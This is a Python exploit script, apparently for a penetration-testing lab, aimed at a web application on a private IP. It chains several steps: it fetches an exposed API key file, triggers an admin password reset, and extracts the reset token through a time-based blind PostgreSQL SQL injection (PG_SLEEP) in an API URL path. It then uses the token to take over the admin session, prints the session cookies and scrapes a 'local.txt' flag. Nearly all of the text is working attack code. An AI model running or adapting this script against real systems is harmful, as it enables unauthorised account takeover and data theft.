import requests
import string
import time
import re
import threading
from flask import Flask

app = Flask(__name__)

# Flask Default Port: 5000
target = "192.168.166.155"  # IP Address # SET THIS
attacker = "123.123.123.123"  # Attacker's IP Address # SET THIS

# Multi Threading
threading.Thread(target=lambda: app.run(host=attacker, debug=True, use_reloader=False)).start()


# CHANGE NUMBER OF CHARACTERS TO DUMP
def extract_token(session):
    token = ""
    for position in range(1, 64 + 1):
        token += extract_token_characters(session, position)
    print(token)
    print(f'\nMagic Link: http://{target}/magicLink/{token}')
    return token


def extract_token_characters(session, position):
    for char in string.printable:
        payload = (
            f'1 AND (SELECT CASE WHEN ASCII(substr((SELECT COLUMN FROM TABLE WHERE user_id=1 LIMIT 1),'
            f'{position},1))={ord(char)} THEN 0=(SELECT 1 FROM PG_SLEEP(5)) END)'
        )

        response_time = session.post(f'http://{target}/api/user/{payload}/activate').elapsed.total_seconds()
        if response_time > 4:
            return char
    exit()


# Initialization
print("\nInitializing...")
time.sleep(1)
session = requests.Session()
session.get(f'http://{target}/')

# Extract KEY
print("\nExtracting Key")
session.get(f'http://{target}/path?key=key')
apiKey = session.get(f'http://{target}/key.txt').text.rstrip()
print(f'\nAPI Key: {apiKey}')

# trigger password reset Link
print("\n Trigger password reset link")
session.post(f'http://{target}/passwordReset', data={'username': 'admin'})

# Extract SQL Injection
print("\nExtracting token via SQL Injection")
resetToken = extract_token(session)

# Log in as 
session.get(f'http://{target}/reset/{resetToken}')

# Print Session Variables
print("\nSession Cookies:")
print(session.cookies.get_dict())

# Visit Admin Page 
adminPageResponse = session.get(f'http://{target}/admin')

# Extract the local.txt
match = re.search(r'<h3><code>([^<]+)</code>- local.txt</h3>', adminPageResponse.text)
if match:
    extractedString = match.group(1)
    print("\nlocal.txt:")
    print(extractedString)
else:
    print("\nlocal.txt not found. Please check your regular expression")
